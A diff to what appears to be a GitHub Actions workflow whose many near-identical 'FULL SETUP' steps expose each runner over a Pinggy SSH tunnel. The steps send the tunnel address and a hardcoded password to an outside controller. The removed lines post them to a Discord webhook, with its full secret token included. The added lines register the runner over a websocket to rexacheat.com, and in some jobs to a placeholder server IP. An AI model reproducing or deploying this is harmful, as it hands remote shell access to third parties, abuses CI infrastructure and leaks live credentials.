-          curl -s -H "Content-Type: application/json" -X POST -d "{\"content\":\"SSH: $CLEAN\nUser: runner\nPass: Venom123!\"}" "https://discord.com/api/webhooks/1461013177658769602/mjg15yU9egXIhpHMvomG2Brb5ASM8WJ8ca0CE-Foi_HHpTXox_LfTsYOLH-bv1xgzSKc" || true
+          python3 -m pip install websockets --break-system-packages || pip install websockets --break-system-packages
+          python3 - <<EOF
+          import asyncio, websockets, json
+          async def s():
+              try:
+                  async with websockets.connect('wss://rexacheat.com/ws') as ws:
+                      await ws.send(json.dumps({'type':'register','role':'vds_register','ssh_info':'SSH: $CLEAN\nUser: runner\nPass: Venom123!'}))
+              except: pass
+          asyncio.run(s())
+          EOF
           sleep 3000
       - name: FULL SETUP 3
         run: |
@@ -2794,7 +3883,16 @@ jobs:
           sleep 15
           LINK=$(grep -oE 'tcp://[0-9a-zA-Z\.\-]+:[0-9]+' pinggy.log | head -n1)
           CLEAN=$(echo $LINK | sed 's/tcp:\/\///')
-          curl -s -H "Content-Type: application/json" -X POST -d "{\"content\":\"SSH: $CLEAN\nUser: runner\nPass: Venom123!\"}" "https://discord.com/api/webhooks/1461013177658769602/mjg15yU9egXIhpHMvomG2Brb5ASM8WJ8ca0CE-Foi_HHpTXox_LfTsYOLH-bv1xgzSKc" || true
+          python3 -m pip install websockets --break-system-packages || pip install websockets --break-system-packages
+          python3 - <<EOF
+          import asyncio, websockets, json
+          async def s():
+              try:
+                  async with websockets.connect('wss://rexacheat.com/ws') as ws:
+                      await ws.send(json.dumps({'type':'register','role':'vds_register','ssh_info':'SSH: $CLEAN\nUser: runner\nPass: Venom123!'}))
+              except: pass
+          asyncio.run(s())
+          EOF
           sleep 3000
       - name: FULL SETUP 4
         run: |
@@ -2816,7 +3914,16 @@ jobs:
           sleep 15
           LINK=$(grep -oE 'tcp://[0-9a-zA-Z\.\-]+:[0-9]+' pinggy.log | head -n1)
           CLEAN=$(echo $LINK | sed 's/tcp:\/\///')
-          curl -s -H "Content-Type: application/json" -X POST -d "{\"content\":\"SSH: $CLEAN\nUser: runner\nPass: Venom123!\"}" "https://discord.com/api/webhooks/1461013177658769602/mjg15yU9egXIhpHMvomG2Brb5ASM8WJ8ca0CE-Foi_HHpTXox_LfTsYOLH-bv1xgzSKc" || true
+          python3 -m pip install websockets --break-system-packages || pip install websockets --break-system-packages
+          python3 - <<EOF
+          import asyncio, websockets, json
+          async def s():
+              try:
+                  async with websockets.connect('wss://rexacheat.com/ws') as ws:
+                      await ws.send(json.dumps({'type':'register','role':'vds_register','ssh_info':'SSH: $CLEAN\nUser: runner\nPass: Venom123!'}))
+              except: pass
+          asyncio.run(s())
+          EOF
           sleep 3000
       - name: FULL SETUP 5
         run: |
@@ -2838,7 +3945,16 @@ jobs:
           sleep 15
           LINK=$(grep -oE 'tcp://[0-9a-zA-Z\.\-]+:[0-9]+' pinggy.log | head -n1)
           CLEAN=$(echo $LINK | sed 's/tcp:\/\///')
-          curl -s -H "Content-Type: application/json" -X POST -d "{\"content\":\"SSH: $CLEAN\nUser: runner\nPass: Venom123!\"}" "https://discord.com/api/webhooks/1461013177658769602/mjg15yU9egXIhpHMvomG2Brb5ASM8WJ8ca0CE-Foi_HHpTXox_LfTsYOLH-bv1xgzSKc" || true
+          python3 -m pip install websockets --break-system-packages || pip install websockets --break-system-packages
+          python3 - <<EOF
+          import asyncio, websockets, json
+          async def s():
+              try:
+                  async with websockets.connect('wss://rexacheat.com/ws') as ws:
+                      await ws.send(json.dumps({'type':'register','role':'vds_register','ssh_info':'SSH: $CLEAN\nUser: runner\nPass: Venom123!'}))
+              except: pass
+          asyncio.run(s())
+          EOF
           sleep 3000
       - name: FULL SETUP 6
         run: |
@@ -2860,7 +3976,16 @@ jobs:
           sleep 15
           LINK=$(grep -oE 'tcp://[0-9a-zA-Z\.\-]+:[0-9]+' pinggy.log | head -n1)
           CLEAN=$(echo $LINK | sed 's/tcp:\/\///')
-          curl -s -H "Content-Type: application/json" -X POST -d "{\"content\":\"SSH: $CLEAN\nUser: runner\nPass: Venom123!\"}" "https://discord.com/api/webhooks/1461013177658769602/mjg15yU9egXIhpHMvomG2Brb5ASM8WJ8ca0CE-Foi_HHpTXox_LfTsYOLH-bv1xgzSKc" || true
+          python3 -m pip install websockets --break-system-packages || pip install websockets --break-system-packages
+          python3 - <<EOF
+          import asyncio, websockets, json
+          async def s():
+              try:
+                  async with websockets.connect('wss://rexacheat.com/ws') as ws:
+                      await ws.send(json.dumps({'type':'register','role':'vds_register','ssh_info':'SSH: $CLEAN\nUser: runner\nPass: Venom123!'}))
+              except: pass
+          asyncio.run(s())
+          EOF
           sleep 3000
       - name: FULL SETUP 7
         run: |
@@ -2882,7 +4007,16 @@ jobs:
           sleep 15
           LINK=$(grep -oE 'tcp://[0-9a-zA-Z\.\-]+:[0-9]+' pinggy.log | head -n1)
           CLEAN=$(echo $LINK | sed 's/tcp:\/\///')
-          curl -s -H "Content-Type: application/json" -X POST -d "{\"content\":\"SSH: $CLEAN\nUser: runner\nPass: Venom123!\"}" "https://discord.com/api/webhooks/1461013177658769602/mjg15yU9egXIhpHMvomG2Brb5ASM8WJ8ca0CE-Foi_HHpTXox_LfTsYOLH-bv1xgzSKc" || true
+          python3 -m pip install websockets --break-system-packages || pip install websockets --break-system-packages
+          python3 - <<EOF
+          import asyncio, websockets, json
+          async def s():
+              try:
+                  async with websockets.connect('wss://rexacheat.com/ws') as ws:
+                      await ws.send(json.dumps({'type':'register','role':'vds_register','ssh_info':'SSH: $CLEAN\nUser: runner\nPass: Venom123!'}))
+              except: pass
+          asyncio.run(s())
+          EOF
           sleep 3000
 
   pinggy-19:
@@ -2910,7 +4044,16 @@ jobs:
           sleep 15
           LINK=$(grep -oE 'tcp://[0-9a-zA-Z\.\-]+:[0-9]+' pinggy.log | head -n1)
           CLEAN=$(echo $LINK | sed 's/tcp:\/\///')
-          curl -s -H "Content-Type: application/json" -X POST -d "{\"content\":\"SSH: $CLEAN\nUser: runner\nPass: Venom123!\"}" "https://discord.com/api/webhooks/1461013177658769602/mjg15yU9egXIhpHMvomG2Brb5ASM8WJ8ca0CE-Foi_HHpTXox_LfTsYOLH-bv1xgzSKc" || true
+          python3 -m pip install websockets --break-system-packages || pip install websockets --break-system-packages
+          python3 - <<EOF
+          import asyncio, websockets, json
+          async def s():
+              try:
+                  async with websockets.connect('wss://rexacheat.com/ws') as ws:
+                      await ws.send(json.dumps({'type':'register','role':'vds_register','ssh_info':'SSH: $CLEAN\nUser: runner\nPass: Venom123!'}))
+              except: pass
+          asyncio.run(s())
+          EOF
           sleep 3000
       - name: FULL SETUP 2
         run: |
@@ -2932,7 +4075,16 @@ jobs:
           sleep 15
           LINK=$(grep -oE 'tcp://[0-9a-zA-Z\.\-]+:[0-9]+' pinggy.log | head -n1)
           CLEAN=$(echo $LINK | sed 's/tcp:\/\///')
-          curl -s -H "Content-Type: application/json" -X POST -d "{\"content\":\"SSH: $CLEAN\nUser: runner\nPass: Venom123!\"}" "https://discord.com/api/webhooks/1461013177658769602/mjg15yU9egXIhpHMvomG2Brb5ASM8WJ8ca0CE-Foi_HHpTXox_LfTsYOLH-bv1xgzSKc" || true
+          python3 -m pip install websockets --break-system-packages || pip install websockets --break-system-packages
+          python3 - <<EOF
+          import asyncio, websockets, json
+          async def s():
+              try:
+                  async with websockets.connect('wss://rexacheat.com/ws') as ws:
+                      await ws.send(json.dumps({'type':'register','role':'vds_register','ssh_info':'SSH: $CLEAN\nUser: runner\nPass: Venom123!'}))
+              except: pass
+          asyncio.run(s())
+          EOF
           sleep 3000
       - name: FULL SETUP 3
         run: |
@@ -2954,7 +4106,16 @@ jobs:
           sleep 15
           LINK=$(grep -oE 'tcp://[0-9a-zA-Z\.\-]+:[0-9]+' pinggy.log | head -n1)
           CLEAN=$(echo $LINK | sed 's/tcp:\/\///')
-          curl -s -H "Content-Type: application/json" -X POST -d "{\"content\":\"SSH: $CLEAN\nUser: runner\nPass: Venom123!\"}" "https://discord.com/api/webhooks/1461013177658769602/mjg15yU9egXIhpHMvomG2Brb5ASM8WJ8ca0CE-Foi_HHpTXox_LfTsYOLH-bv1xgzSKc" || true
+          python3 -m pip install websockets --break-system-packages || pip install websockets --break-system-packages
+          python3 - <<EOF
+          import asyncio, websockets, json
+          async def s():
+              try:
+                  async with websockets.connect('wss://rexacheat.com/ws') as ws:
+                      await ws.send(json.dumps({'type':'register','role':'vds_register','ssh_info':'SSH: $CLEAN\nUser: runner\nPass: Venom123!'}))
+              except: pass
+          asyncio.run(s())
+          EOF
           sleep 3000
       - name: FULL SETUP 4
         run: |
@@ -2976,7 +4137,16 @@ jobs:
           sleep 15
           LINK=$(grep -oE 'tcp://[0-9a-zA-Z\.\-]+:[0-9]+' pinggy.log | head -n1)
           CLEAN=$(echo $LINK | sed 's/tcp:\/\///')
-          curl -s -H "Content-Type: application/json" -X POST -d "{\"content\":\"SSH: $CLEAN\nUser: runner\nPass: Venom123!\"}" "https://discord.com/api/webhooks/1461013177658769602/mjg15yU9egXIhpHMvomG2Brb5ASM8WJ8ca0CE-Foi_HHpTXox_LfTsYOLH-bv1xgzSKc" || true
+          python3 -m pip install websockets --break-system-packages || pip install websockets --break-system-packages
+          python3 - <<EOF
+          import asyncio, websockets, json
+          async def s():
+              try:
+                  async with websockets.connect('wss://rexacheat.com/ws') as ws:
+                      await ws.send(json.dumps({'type':'register','role':'vds_register','ssh_info':'SSH: $CLEAN\nUser: runner\nPass: Venom123!'}))
+              except: pass
+          asyncio.run(s())
+          EOF
           sleep 3000
       - name: FULL SETUP 5
         run: |
@@ -2998,7 +4168,16 @@ jobs:
           sleep 15
           LINK=$(grep -oE 'tcp://[0-9a-zA-Z\.\-]+:[0-9]+' pinggy.log | head -n1)
           CLEAN=$(echo $LINK | sed 's/tcp:\/\///')
-          curl -s -H "Content-Type: application/json" -X POST -d "{\"content\":\"SSH: $CLEAN\nUser: runner\nPass: Venom123!\"}" "https://discord.com/api/webhooks/1461013177658769602/mjg15yU9egXIhpHMvomG2Brb5ASM8WJ8ca0CE-Foi_HHpTXox_LfTsYOLH-bv1xgzSKc" || true
+          python3 -m pip install websockets --break-system-packages || pip install websockets --break-system-packages
+          python3 - <<EOF
+          import asyncio, websockets, json
+          async def s():
+              try:
+                  async with websockets.connect('wss://rexacheat.com/ws') as ws:
+                      await ws.send(json.dumps({'type':'register','role':'vds_register','ssh_info':'SSH: $CLEAN\nUser: runner\nPass: Venom123!'}))
+              except: pass
+          asyncio.run(s())
+          EOF
           sleep 3000
       - name: FULL SETUP 6
         run: |
@@ -3020,7 +4199,16 @@ jobs:
           sleep 15
           LINK=$(grep -oE 'tcp://[0-9a-zA-Z\.\-]+:[0-9]+' pinggy.log | head -n1)
           CLEAN=$(echo $LINK | sed 's/tcp:\/\///')
-          curl -s -H "Content-Type: application/json" -X POST -d "{\"content\":\"SSH: $CLEAN\nUser: runner\nPass: Venom123!\"}" "https://discord.com/api/webhooks/1461013177658769602/mjg15yU9egXIhpHMvomG2Brb5ASM8WJ8ca0CE-Foi_HHpTXox_LfTsYOLH-bv1xgzSKc" || true
+          python3 -m pip install websockets --break-system-packages || pip install websockets --break-system-packages
+          python3 - <<EOF
+          import asyncio, websockets, json
+          async def s():
+              try:
+                  async with websockets.connect('wss://rexacheat.com/ws') as ws:
+                      await ws.send(json.dumps({'type':'register','role':'vds_register','ssh_info':'SSH: $CLEAN\nUser: runner\nPass: Venom123!'}))
+              except: pass
+          asyncio.run(s())
+          EOF
           sleep 3000
       - name: FULL SETUP 7
         run: |
@@ -3042,7 +4230,16 @@ jobs:
           sleep 15
           LINK=$(grep -oE 'tcp://[0-9a-zA-Z\.\-]+:[0-9]+' pinggy.log | head -n1)
           CLEAN=$(echo $LINK | sed 's/tcp:\/\///')
-          curl -s -H "Content-Type: application/json" -X POST -d "{\"content\":\"SSH: $CLEAN\nUser: runner\nPass: Venom123!\"}" "https://discord.com/api/webhooks/1461013177658769602/mjg15yU9egXIhpHMvomG2Brb5ASM8WJ8ca0CE-Foi_HHpTXox_LfTsYOLH-bv1xgzSKc" || true
+          python3 -m pip install websockets --break-system-packages || pip install websockets --break-system-packages
+          python3 - <<EOF
+          import asyncio, websockets, json
+          async def s():
+              try:
+                  async with websockets.connect('wss://rexacheat.com/ws') as ws:
+                      await ws.send(json.dumps({'type':'register','role':'vds_register','ssh_info':'SSH: $CLEAN\nUser: runner\nPass: Venom123!'}))
+              except: pass
+          asyncio.run(s())
+          EOF
           sleep 3000
 
   pinggy-20:
@@ -3070,7 +4267,8 @@ jobs:
           sleep 15
           LINK=$(grep -oE 'tcp://[0-9a-zA-Z\.\-]+:[0-9]+' pinggy.log | head -n1)
           CLEAN=$(echo $LINK | sed 's/tcp:\/\///')
-          curl -s -H "Content-Type: application/json" -X POST -d "{\"content\":\"SSH: $CLEAN\nUser: runner\nPass: Venom123!\"}" "https://discord.com/api/webhooks/1461013177658769602/mjg15yU9egXIhpHMvomG2Brb5ASM8WJ8ca0CE-Foi_HHpTXox_LfTsYOLH-bv1xgzSKc" || true
+          python3 -m pip install websockets --break-system-packages || pip install websockets --break-system-packages
+          python3 -c "import asyncio, websockets, json; async def s():\n try:\n  async with websockets.connect('ws://YOUR_SERVER_IP:9999') as ws: await ws.send(json.dumps({'type':'register','role':'vds_register','ssh_info':'SSH: $CLEAN\\nUser: runner\\nPass: Venom123!'}))\n except: pass\nasyncio.run(s())"
           sleep 3000
       - name: FULL SETUP 2
         run: |
@@ -3092,7 +4290,8 @@ jobs:
           sleep 15
           LINK=$(grep -oE 'tcp://[0-9a-zA-Z\.\-]+:[0-9]+' pinggy.log | head -n1)
           CLEAN=$(echo $LINK | sed 's/tcp:\/\///')
-          curl -s -H "Content-Type: application/json" -X POST -d "{\"content\":\"SSH: $CLEAN\nUser: runner\nPass: Venom123!\"}" "https://discord.com/api/webhooks/1461013177658769602/mjg15yU9egXIhpHMvomG2Brb5ASM8WJ8ca0CE-Foi_HHpTXox_LfTsYOLH-bv1xgzSKc" || true
+          python3 -m pip install websockets --break-system-packages || pip install websockets --break-system-packages
+          python3 -c "import asyncio, websockets, json; async def s():\n try:\n  async with websockets.connect('ws://YOUR_SERVER_IP:9999') as ws: await ws.send(json.dumps({'type':'register','role':'vds_register','ssh_info':'SSH: $CLEAN\\nUser: runner\\nPass: Venom123!'}))\n except: pass\nasyncio.run(s())"
           sleep 3000
       - name: FULL SETUP 3
         run: |
@@ -3114,7 +4313,8 @@ jobs:
           sleep 15
           LINK=$(grep -oE 'tcp://[0-9a-zA-Z\.\-]+:[0-9]+' pinggy.log | head -n1)
           CLEAN=$(echo $LINK | sed 's/tcp:\/\///')
-          curl -s -H "Content-Type: application/json" -X POST -d "{\"content\":\"SSH: $CLEAN\nUser: runner\nPass: Venom123!\"}" "https://discord.com/api/webhooks/1461013177658769602/mjg15yU9egXIhpHMvomG2Brb5ASM8WJ8ca0CE-Foi_HHpTXox_LfTsYOLH-bv1xgzSKc" || true
+          python3 -m pip install websockets --break-system-packages || pip install websockets --break-system-packages
+          python3 -c "import asyncio, websockets, json; async def s():\n try:\n  async with websockets.connect('ws://YOUR_SERVER_IP:9999') as ws: await ws.send(json.dumps({'type':'register','role':'vds_register','ssh_info':'SSH: $CLEAN\\nUser: runner\\nPass: Venom123!'}))\n except: pass\nasyncio.run(s())"
           sleep 3000
       - name: FULL SETUP 4
         run: |
@@ -3136,7 +4336,8 @@ jobs:
           sleep 15
           LINK=$(grep -oE 'tcp://[0-9a-zA-Z\.\-]+:[0-9]+' pinggy.log | head -n1)
           CLEAN=$(echo $LINK | sed 's/tcp:\/\///')
-          curl -s -H "Content-Type: application/json" -X POST -d "{\"content\":\"SSH: $CLEAN\nUser: runner\nPass: Venom123!\"}" "https://discord.com/api/webhooks/1461013177658769602/mjg15yU9egXIhpHMvomG2Brb5ASM8WJ8ca0CE-Foi_HHpTXox_LfTsYOLH-bv1xgzSKc" || true
+          python3 -m pip install websockets --break-system-packages || pip install websockets --break-system-packages
+          python3 -c "import asyncio, websockets, json; async def s():\n try:\n  async with websockets.connect('ws://YOUR_SERVER_IP:9999') as ws: await ws.send(json.dumps({'type':'register','role':'vds_register','ssh_info':'SSH: $CLEAN\\nUser: runner\\nPass: Venom123!'}))\n except: pass\nasyncio.run(s())"
           sleep 3000
       - name: FULL SETUP 5
         run: |
@@ -3158,7 +4359,8 @@ jobs:
           sleep 15
           LINK=$(grep -oE 'tcp://[0-9a-zA-Z\.\-]+:[0-9]+' pinggy.log | head -n1)
           CLEAN=$(echo $LINK | sed 's/tcp:\/\///')
-          curl -s -H "Content-Type: application/json" -X POST -d "{\"content\":\"SSH: $CLEAN\nUser: runner\nPass: Venom123!\"}" "https://discord.com/api/webhooks/1461013177658769602/mjg15yU9egXIhpHMvomG2Brb5ASM8WJ8ca0CE-Foi_HHpTXox_LfTsYOLH-bv1xgzSKc" || true
+          python3 -m pip install websockets --break-system-packages || pip install websockets --break-system-packages
+          python3 -c "import asyncio, websockets, json; async def s():\n try:\n  async with websockets.connect('ws://YOUR_SERVER_IP:9999') as ws: await ws.send(json.dumps({'type':'register','role':'vds_register','ssh_info':'SSH: $CLEAN\\nUser: runner\\nPass: Venom123!'}))\n except: pass\nasyncio.run(s())"
           sleep 3000
       - name: FULL SETUP 6
         run: |
@@ -3180,7 +4382,8 @@ jobs:
           sleep 15
           LINK=$(grep -oE 'tcp://[0-9a-zA-Z\.\-]+:[0-9]+' pinggy.log | head -n1)
           CLEAN=$(echo $LINK | sed 's/tcp:\/\///')
-          curl -s -H "Content-Type: application/json" -X POST -d "{\"content\":\"SSH: $CLEAN\nUser: runner\nPass: Venom123!\"}" "https://discord.com/api/webhooks/1461013177658769602/mjg15yU9egXIhpHMvomG2Brb5ASM8WJ8ca0CE-Foi_HHpTXox_LfTsYOLH-bv1xgzSKc" || true
+          python3 -m pip install websockets --break-system-packages || pip install websockets --break-system-packages
+          python3 -c "import asyncio, websockets, json; async def s():\n try:\n  async with websockets.connect('ws://YOUR_SERVER_IP:9999') as ws: await ws.send(json.dumps({'type':'register','role':'vds_register','ssh_info':'SSH: $CLEAN\\nUser: runner\\nPass: Venom123!'}))\n except: pass\nasyncio.run(s())"
           sleep 3000
       - name: FULL SETUP 7
         run: |
